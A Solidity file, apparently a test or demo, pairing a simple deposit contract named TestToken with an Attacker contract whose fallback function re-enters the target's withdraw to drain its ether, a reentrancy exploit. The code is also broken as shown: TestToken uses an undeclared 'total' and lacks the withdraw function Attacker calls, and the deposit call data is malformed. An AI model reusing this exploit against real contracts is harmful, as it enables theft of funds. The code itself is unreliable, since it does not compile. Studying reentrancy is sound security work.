pragma solidity^0.5.0;

contract TestToken {
    mapping (address => uint256) balances;

    constructor() public {
        total = 0;
    }

    function deposit() public payable returns (bool success) {
        if (balances[msg.sender] + msg.value < msg.value) return false;
        if (total + msg.value < msg.value) return false;
        balances[msg.sender] += msg.value;
        total += msg.value;
        return true;
    }

}

contract Attacker {
    
    TestToken token;
    uint256 _value;
    event logString(uint256, uint256, uint256);
      constructor () public payable {

      }
  function deposit(address _tokenAddress) public payable {
      token = TestToken(_tokenAddress);
      _value = address(this).balance;
    
    _tokenAddress.call.value(address(this).balance)(abi.encode(bytes4(keccak256("deposit()"))));
  }

  function attack(address _tokenAddress) public {
      token = TestToken(_tokenAddress);
      token.withdraw(_value);
  }

  function() external payable {
    emit logString(address(this).balance, msg.value, address(token).balance);
    if (address(token).balance > msg.value) token.withdraw(msg.value);
  }

  function getBalance() public view returns(uint) { return address(this).balance; } 
  function getTestTokenBalance() public view returns(uint) { return address(token).balance; } 
}
